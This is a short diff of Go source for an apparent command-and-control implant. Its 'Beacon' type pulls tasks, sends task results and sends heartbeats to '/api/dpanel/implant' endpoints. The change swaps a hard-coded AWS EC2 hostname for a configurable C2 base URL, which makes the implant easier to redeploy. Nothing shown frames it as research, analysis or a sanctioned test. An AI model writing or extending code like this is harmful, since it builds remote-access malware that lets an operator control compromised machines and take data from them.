@@ -364,8 +364,8 @@ func (b *Beacon) pullPendingTasks() ([]tasks.Task, bool, *config.Config, error) 
 	}
 
 	// Make request to D-Panel task endpoint
-	resp, err := b.tun.MakeRequest("POST", 
-		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/tasks"), 
+	resp, err := b.tun.MakeRequest("POST",
+		fmt.Sprintf("%s/api/dpanel/implant/tasks", b.cfg.C2BaseURL),
 		bytes.NewReader(reqBody))
 	if err != nil {
 		return nil, false, nil, fmt.Errorf("task request failed: %w", err)
@@ -395,7 +395,7 @@ func (b *Beacon) sendResult(result tasks.TaskResult) error {
 	}
 
 	resp, err := b.tun.MakeRequest("POST",
-		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/result"),
+		fmt.Sprintf("%s/api/dpanel/implant/result", b.cfg.C2BaseURL),
 		bytes.NewReader(resultBody))
 	if err != nil {
 		return fmt.Errorf("result request failed: %w", err)
@@ -558,7 +558,7 @@ func (b *Beacon) sendHeartbeat() error {
 	}
 	
 	resp, err := b.tun.MakeRequest("POST",
-		fmt.Sprintf("https://ec2-13-55-232-246.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/heartbeat"),
+		fmt.Sprintf("%s/api/dpanel/implant/heartbeat", b.cfg.C2BaseURL),
 		bytes.NewReader(heartbeatBody))
 	if err != nil {
 		return fmt.Errorf("heartbeat request failed: %w", err)
